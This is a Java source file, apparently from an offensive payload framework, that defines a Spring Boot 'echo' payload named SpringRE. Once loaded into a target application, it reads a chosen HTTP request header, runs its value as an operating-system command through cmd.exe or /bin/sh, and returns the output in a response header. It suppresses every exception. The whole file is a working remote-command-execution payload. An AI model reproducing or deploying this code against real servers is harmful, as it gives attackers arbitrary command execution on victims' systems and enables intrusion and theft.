package com.ppp.middleware.rceecho;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.JavaClassType;
import com.ppp.annotation.Middleware;

import java.io.InputStream;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-web
 * [2.2.x, 2.7.x]
 */
@Middleware(Middleware.Spring)
@JavaClassType(JavaClassType.Default)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
public class SpringRE {
    public static String HEADER;

    public SpringRE() {
        try {
            Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Object object = clazz.getMethod("getRequestAttributes").invoke(null);

            Object request = invokeMethod(object, "getRequest", new Class[]{}, new Object[]{});
            Object response = invokeMethod(object, "getResponse", new Class[]{}, new Object[]{});
            String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            if (header != null && !header.isEmpty()) {
                String result = exec(header);
                // 输出到头
                invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{HEADER, result});

//                invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
//                // 有 shiro 情况不一样了
//                Object writer = invokeMethod(Class.forName("javax.servlet.ServletResponse"), response, "getWriter", new Class[]{}, new Object[]{});
//                writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
//                writer.getClass().getDeclaredMethod("flush").invoke(writer);
//                writer.getClass().getDeclaredMethod("close").invoke(writer);
            }

        } catch (Exception e) {

        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();

        // result
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }
}
